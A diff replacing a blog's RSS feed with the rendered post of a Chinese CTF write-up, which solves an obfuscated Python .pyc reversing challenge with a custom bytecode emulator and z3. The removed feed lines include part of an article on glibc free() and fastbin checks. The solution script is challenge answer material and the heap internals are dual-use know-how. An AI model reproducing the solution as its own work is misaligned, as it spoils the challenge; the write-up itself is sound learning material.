@@ -1,28 +1,297 @@
-<?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0"
-  xmlns:atom="http://www.w3.org/2005/Atom"
-  xmlns:content="http://purl.org/rss/1.0/modules/content/">
-  <channel>
-    <title>Hc1m1</title>
-    <link>http://0x48.pw/</link>
-    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
+<!DOCTYPE html>
+<html lang="default">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>Pwnhub之奇妙的巨蟒 Writeup | Hc1m1</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力">
+<meta name="keywords" content="CTF,Python,RE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnhub之奇妙的巨蟒 Writeup">
+<meta property="og:url" content="http://0x48.pw/2017/08/29/0x38/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description" content="本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力">
+<meta property="og:updated_time" content="2017-08-29T04:15:13.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnhub之奇妙的巨蟒 Writeup">
+<meta name="twitter:description" content="本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力">
+  
+    <link rel="alternative" href="/rss.xml" title="Hc1m1" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  
+      <link href="//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css" rel="stylesheet">
+  
+  
+      <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+      <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <script src="//cdn.bootcss.com/jquery/1.9.1/jquery.min.js"></script>
+  <script>
+      var yiliaConfig = {
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false,
+      }
+  </script>
+
+  
+      <script>
+          yiliaConfig.rootUrl = "/";
+      </script>
+  
+
+  
+      <script>
+          var _hmt = _hmt || [];
+          (function() {
+              var hm = document.createElement("script");
+              hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+              var s = document.getElementsByTagName("script")[0]; 
+              s.parentNode.insertBefore(hm, s);
+          })();
+      </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+  
+</head>
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Hcamael</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">Blog</p>
+        
+                
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 17.14px;">Crypto</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Python/" style="font-size: 14.29px;">Python</a> <a href="/tags/RE/" style="font-size: 12.86px;">RE</a> <a href="/tags/SQLi/" style="font-size: 11.43px;">SQLi</a> <a href="/tags/Web/" style="font-size: 15.71px;">Web</a> <a href="/tags/bin/" style="font-size: 18.57px;">bin</a> <a href="/tags/network/" style="font-size: 10px;">network</a> <a href="/tags/old-blog/" style="font-size: 10px;">old_blog</a> <a href="/tags/php/" style="font-size: 12.86px;">php</a> <a href="/tags/research/" style="font-size: 12.86px;">research</a> <a href="/tags/sb/" style="font-size: 10px;">sb</a> <a href="/tags/share/" style="font-size: 10px;">share</a> <a href="/tags/随笔/" style="font-size: 10px;">随笔</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://wiki.hduisa.org">wiki</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://drops.hduisa.org">Drops</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="http://qn.lazysheep.cc/img/author.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">Blog</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <li id="Email"><a class="Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a></li>
+                            
+                                <li id="GitHub"><a class="GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a></li>
+                            
+                                <li id="RSS"><a class="RSS" target="_blank" href="/rss.xml" title="RSS"></a></li>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-0x38" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/08/29/0x38/" class="article-date">
+      <time datetime="2017-08-29T04:01:38.000Z" itemprop="datePublished">2017-08-29</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
     
-    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
-    <pubDate>Tue, 29 Aug 2017 04:15:13 GMT</pubDate>
-    <generator>http://hexo.io/</generator>
+      <input type="hidden" class="isFancy" />
     
-    <item>
-      <title>Pwnhub之奇妙的巨蟒 Writeup</title>
-      <link>http://0x48.pw/2017/08/29/0x38/</link>
-      <guid>http://0x48.pw/2017/08/29/0x38/</guid>
-      <pubDate>Tue, 29 Aug 2017 04:01:38 GMT</pubDate>
-      <description>
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pwnhub之奇妙的巨蟒 Writeup
+    </h1>
+  
+
+      </header>
       
-        &lt;p&gt;本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力&lt;/p&gt;
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RE/">RE</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
       
-      </description>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-      <content:encoded><![CDATA[<p>本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力</p>
+          
+        <p>本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力</p>
 <a id="more"></a>
 <p>本题是一道pyc逆向题，用uncompyle6没法跑出来，所以猜测又是考python的opcode</p>
 <p>之前做过相关研究，也写过一篇blog：<a href="http://0x48.pw/2017/03/20/0x2f/">http://0x48.pw/2017/03/20/0x2f/</a></p>
@@ -85,423 +354,182 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python2.7</span></div><div class="line"><span class="comment"># -*- coding=utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> dis, marshal</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> u16</div><div class="line"><span class="keyword">import</span> z3</div><div class="line"></div><div class="line">flag_n = z3.BitVecs(<span class="string">'x__0 x__1 x__2 x__3 x__4 x__5 x__6 x__7 x__8 x__9 x__10 x__11 x__12 x__13 x__14 x__15 x__16 x__17'</span>, <span class="number">8</span>)</div><div class="line"></div><div class="line">f = open(<span class="string">"final.pyc"</span>)</div><div class="line">f.read(<span class="number">8</span>)</div><div class="line"></div><div class="line">code = marshal.load(f)</div><div class="line"></div><div class="line">code = code.co_consts[<span class="number">34</span>]</div><div class="line"><span class="keyword">print</span> code.co_name</div><div class="line">asm = code.co_code</div><div class="line"><span class="comment"># asm = code.co_consts[45].co_code</span></div><div class="line">stack = []</div><div class="line">varn = &#123;</div><div class="line">    <span class="string">'DIVIDER'</span>: <span class="keyword">None</span>,       <span class="comment"># DEVIDER</span></div><div class="line">    <span class="string">'OOO000OOOOOO00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOOO000OO000OOOOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'OOO0OOO00O00OOOO0'</span>: flag_n,</div><div class="line">    <span class="string">'O0OOO0O0O00O00OOO'</span>: <span class="keyword">None</span>,</div><div class="line">    <span class="string">'O0O000OO00OO00OO0'</span>: <span class="keyword">None</span>,</div><div class="line">&#125;</div><div class="line">flag = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="comment"># n = 1632</span></div><div class="line">n = <span class="number">0</span></div><div class="line">add = <span class="number">0</span></div><div class="line">index = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">if</span> len(asm) &lt;= n:</div><div class="line">        <span class="keyword">print</span> n</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'q'</span> <span class="keyword">or</span> asm[n] == <span class="string">'r'</span>:  <span class="comment"># JUMP_ABSOLUTE    or  POP_JUMP_IF_FALSE</span></div><div class="line">        n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'n'</span>:  <span class="comment"># JUMP_FORWARD</span></div><div class="line">        n += u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>]) + <span class="number">3</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="comment"># elif asm[n] in one_para:</span></div><div class="line">    <span class="comment">#     dis.disassemble_string(asm[n])</span></div><div class="line">    <span class="comment">#     n+=1</span></div><div class="line">    <span class="comment">#     continue</span></div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"\x53"</span>:   <span class="comment"># RETURN</span></div><div class="line">        dis.disassemble_string(asm[n])</div><div class="line">        <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"%d: "</span>%n</div><div class="line">        dis.disassemble_string(asm[n:n+<span class="number">3</span>])</div><div class="line">        add = <span class="number">3</span></div><div class="line">    <span class="keyword">except</span> IndexError:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            dis.disassemble_string(asm[n])</div><div class="line">            add = <span class="number">1</span></div><div class="line">        <span class="keyword">except</span> IndexError:</div><div class="line">            <span class="keyword">print</span> <span class="string">"%d: %d"</span>%(n, ord(asm[n]))</div><div class="line">            <span class="keyword">break</span></div><div class="line">    </div><div class="line">    <span class="keyword">if</span> asm[n] == <span class="string">'d'</span>: <span class="comment"># LOAD_CONST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = code.co_consts[key]</div><div class="line">        stack.append(value)</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'|'</span>: <span class="comment"># LOAD_FAST</span></div><div class="line">        key = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        value = varn[code.co_varnames[key]]</div><div class="line">        stack.append(value)</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'&#125;'</span>:   <span class="comment"># STORE_FAST</span></div><div class="line">        key = code.co_varnames[u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])]</div><div class="line">        varn[key] = stack.pop()</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">'k'</span>:   <span class="comment"># COMPARE_OP</span></div><div class="line">        op = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">        <span class="keyword">if</span> op == <span class="number">3</span>:</div><div class="line">            x1 = stack.pop()</div><div class="line">            x2 = stack.pop()</div><div class="line">            flag_n[index] = (x2==x1)</div><div class="line">        <span class="keyword">elif</span> op == <span class="number">2</span>:</div><div class="line">            x1 = stack.pop()</div><div class="line">            x2 = stack.pop()</div><div class="line">            <span class="keyword">if</span> x1 == x2:</div><div class="line">                flag = <span class="number">1</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == <span class="string">"s"</span>:   <span class="comment"># POP_JUMP_IF_TRUE</span></div><div class="line">        <span class="keyword">if</span> flag:</div><div class="line">            n = u16(asm[n+<span class="number">1</span>:n+<span class="number">3</span>])</div><div class="line">            flag = <span class="number">0</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">25</span>):   <span class="comment"># BINARY_SUBSCR</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2[x1])</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        index = x1</div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">20</span>):   <span class="comment"># BINARY_MULTIPLY</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2*x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">22</span>):   <span class="comment"># BINARY_MODULO</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2%x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">65</span>):   <span class="comment"># BINARY_XOR</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2^x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">elif</span> asm[n] == chr(<span class="number">23</span>):   <span class="comment"># BINARY_ADD</span></div><div class="line">        x1 = stack.pop()</div><div class="line">        x2 = stack.pop()</div><div class="line">        stack.append(x2+x1)</div><div class="line">        <span class="comment">#print stack</span></div><div class="line">        n += add</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        n += add</div><div class="line"></div><div class="line">flag = []</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> flag_n:</div><div class="line">    s = z3.Solver()</div><div class="line">    s.add(x)</div><div class="line">    s.check()</div><div class="line">    res = s.model()</div><div class="line">    flag.append(res[res[<span class="number">0</span>]])</div><div class="line"></div><div class="line">flag_hex = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> y <span class="keyword">in</span> flag:</div><div class="line">    flag_hex += chr(y.as_long())</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag_hex.encode(<span class="string">'hex'</span>)</div></pre></td></tr></table></figure>
 <p>思路挺简单的，相当于自己实现一个解释器，实现一个stack，因为我代码中的opcode不全，所以只能针对本题，还有几种思路，比如魔改dis，目前的dis是线性的翻译opcode，可以按照我脚本的思路，当遇到JUMP类指令时，也跟随跳转，但是这个不能去除混淆，混淆还是需要自己写代码去，而我上面自动跑flag的脚本思路是来源于Triton，传入的参数是未知的，就设置为符号变量，当分支判断的时候进行响应的处理，进行动态分析，这样就不需要去混淆。</p>
 <p>等我把Triton研究清楚了，说不定能用Triton调试pyc？</p>
-]]></content:encoded>
+
       
-      <comments>http://0x48.pw/2017/08/29/0x38/#disqus_thread</comments>
-    </item>
+    </div>
     
-    <item>
-      <title>malloc.c源码阅读之__libc_free</title>
-      <link>http://0x48.pw/2017/08/07/0x37/</link>
-      <guid>http://0x48.pw/2017/08/07/0x37/</guid>
-      <pubDate>Mon, 07 Aug 2017 06:20:04 GMT</pubDate>
-      <description>
-      
-        &lt;p&gt;学堆的最好方式还是读malloc.c的源码，所以有了这篇文章，目前计划的是分两篇，一篇是读&lt;code&gt;__libc_free&lt;/code&gt;函数，一篇是读&lt;code&gt;__libc_malloc&lt;/code&gt;函数，本篇是读&lt;code&gt;free&lt;/code&gt;函数的源码。之后有空可能还会写&lt;code&gt;calloc&lt;/code&gt;或者&lt;code&gt;realloc&lt;/code&gt;&lt;/p&gt;
-      
-      </description>
-      
-      <content:encoded><![CDATA[<p>学堆的最好方式还是读malloc.c的源码，所以有了这篇文章，目前计划的是分两篇，一篇是读<code>__libc_free</code>函数，一篇是读<code>__libc_malloc</code>函数，本篇是读<code>free</code>函数的源码。之后有空可能还会写<code>calloc</code>或者<code>realloc</code></p>
-<a id="more"></a>
-<p>读代码使用的是<a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html" target="_blank" rel="external">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html</a></p>
-<p>PS: 默认研究64位</p>
-<p>首先是我画的总的流程图，顺着流程图来</p>
-<p><img src="http://qn.lazysheep.cc/img/free1.png" alt="free1"></p>
-<h2 id="libc-free-void-mem"><a href="#libc-free-void-mem" class="headerlink" title="__libc_free(void *mem)"></a>__libc_free(void *mem)</h2><p><code>free</code>在malloc.c中定义在<code>__libc_free</code>函数中，只有一个参数<code>void *mem</code>，需要free的地址。</p>
-<p>首先是检查<code>__free_hook</code>，在<code>main_arena</code>前面有个地方是储存<code>malloc_hook</code>和<code>free_hook</code>的地方(0CTF 2017 Babyheap中有涉及)，如果该值不为NULL(0)，则把<code>mem</code>当做参数，执行<code>free_hook</code>，执行结束后直接return，就不执行<code>free</code>的后续代码了</p>
-<p>如果不存在<code>free_hook</code>，这一步是检查<code>mem == 0</code>，如果true，则直接return</p>
-<p>如果false，则根据mem对p进行赋值，mem指向的是chunk中储存数据的地方，p是指向chunk header的地方。比如32位系统，<code>p = mem-8</code>，64位系统则是<code>p=mem-16</code></p>
-<p>然后根据chunk size的第二个标志位来判断该地址空间是否是由mmap分配的，如果true，也就是标志位为1，则执行一系列操作(暂不研究mmap相关的操作，先研究brk)，然后执行<code>munmap_chunk(p)</code>，然后执行return</p>
-<p>如果标志位为0(false)，则根据第三个(最高位)标志位判断该chunk是否不属于<code>main_arena</code>，如果标志位为0，表示属于，则把<code>main_arena</code>的地址赋值给<code>ar_ptr</code></p>
-<p>接下来把<code>ar_ptr</code>和<code>p</code>当做参数，去执行<code>_int_free</code>函数：<code>_int_free(ar_ptr, p, 0)</code></p>
-<h2 id="int-free-mstate-av-mchunkptr-p-int-have-lock"><a href="#int-free-mstate-av-mchunkptr-p-int-have-lock" class="headerlink" title="_int_free(mstate av, mchunkptr p, int have_lock)"></a>_int_free(mstate av, mchunkptr p, int have_lock)</h2><p>这里提一下，参数中的mstate表示的是<code>malloc_state</code>结构体也就是<code>main_arena</code>的结构体，<code>mchunkptr</code>表示的是<code>malloc_chunk</code>的结构体（PS：如果结构体还不知道，就别来学堆了）</p>
-<p>在写blog的过程中发现了一个别人做的流程图，而且做的挺不错了，所以我就懒得自己画了，而且画的挺全的，之后的malloc的流程图也直接用这个了：</p>
-<p><img src="http://qn.lazysheep.cc/img/heap.png" alt="free2"></p>
-<h3 id="未区分bin之前"><a href="#未区分bin之前" class="headerlink" title="未区分bin之前"></a>未区分bin之前</h3><p>在未通过size来判断该chunk free之后是处于哪个bin之前，有进行一些通用检测，代码不长，也挺简单的。</p>
-<ol>
-<li>get chunksize，通过p-&gt;mchunksize，去掉标志位后获取chunk的size</li>
-<li>检查p的合法性</li>
-<li>检查size的合法性</li>
-</ol>
-<p>####检查p的合法性</p>
-<p>有两个判断，一个是需要<code>p &lt; (-size)</code>，比如在64位系统中，地址最大是8byte的，如果<code>p &gt; (-size)</code>，那么<code>p + size</code>就超出了合法的地址空间。还有一个检查是对齐的问题，比如64位系统是0x10对齐，所以一个合法的地址都是0x10的倍数，如果<code>p &amp; 0xf != 0</code>就表示p不是16的倍数，则不是一个合法的地址。</p>
-<p>总结下，如果<code>p &gt; (-size) || (p&amp;0xf)</code>为true ，判断出属于非法地址则报错(<code>free(): invalid pointer</code>)退出(报错具体的操作暂时不想详细研究)。</p>
-<h4 id="检查size的合法性"><a href="#检查size的合法性" class="headerlink" title="检查size的合法性"></a>检查size的合法性</h4><p>检查完地址的合法性后就是检查size的合法性，一个是大小问题，首先要<code>size &gt;= MINSIZE</code>，然后因为地址已经是0x10对齐了，所以去掉标志位的size也应该要是0x10的倍数，<code>size &amp; 0xf == 0</code>，其实我觉得这个检查没必要，因为size赋值的时候已经把标志位清零了，然后这期间也没有size的赋值操作了。</p>
-<p>总结下，如果<code>size &lt; MINSIZE || size&amp;0xf</code>为true，则表示无效的size，报错(<code>free(): invalid size</code>)退出。</p>
-<h3 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h3><p>在进行chunk的一些简单的check之后，就是进入各个bin的分支了，首先是fastbin分支</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</div></pre></td></tr></table></figure>
-<p>如果size小于等于fastbin的最大size，则进入fastbin分支。大致流程如下：</p>
-<ol>
-<li>下一个chunk的size要大于2*SIZE_SZ</li>
-<li>下一个chunk的size要小于arena-&gt;system_mem</li>
-<li>arena-&gt;flags最后一bit清零</li>
-<li>根据size获取该chunk该放进哪个fastbin</li>
-<li>fastbin中原本的值不能等于当前chunk的地址</li>
-<li>如果fastbin不为空，获取size对应的index</li>
-<li>chunk的fd赋值为fastbin的值</li>
-<li>fastbin赋值为当前chunk的地址</li>
-<li>fastbin entry判断</li>
-</ol>
-<p>fastbin的流程很简单，大致就上面9个步骤</p>
-<h4 id="next-chunk-size-check"><a href="#next-chunk-size-check" class="headerlink" title="next chunk size check"></a>next chunk size check</h4><p>通过当前chunk的地址加上size，就可以得到下一个chunk。然后获取到下一个chunk的size，对其上下限进行判断，需要大于0x10，小于heap的总size</p>
-<p>检查完以后，下面执行了两个函数，一个是<code>free_perturb</code>，目的是对chunk的data块通过memset赋值，但是默认情况下是不进行操作。也就是说，我们可以通过设置，把free后的chunk的data区域赋值，但是不能赋值成<code>\x00</code></p>
-<p>然后是<code>set_fastchunks</code>，作用是对arena的flags标志位的最低bit清零</p>
-<h4 id="判断fastbin大小"><a href="#判断fastbin大小" class="headerlink" title="判断fastbin大小"></a>判断fastbin大小</h4><p>之前我写个fastbin专题的博客，如果有基础的就知道，fastbin其实是一个长度为10的数组fastbinsY</p>
-<p>index从0，1，2……开始长度是0x20，0x30，0x40……(放不满的问题之前博客中说过)</p>
-<p>所以首先是根据size获取到index，具体的运算是<code>(size &gt;&gt; 4) - 2</code>，  </p>
-<p>然后根据index从fastbinY中取地址和取值：</p>
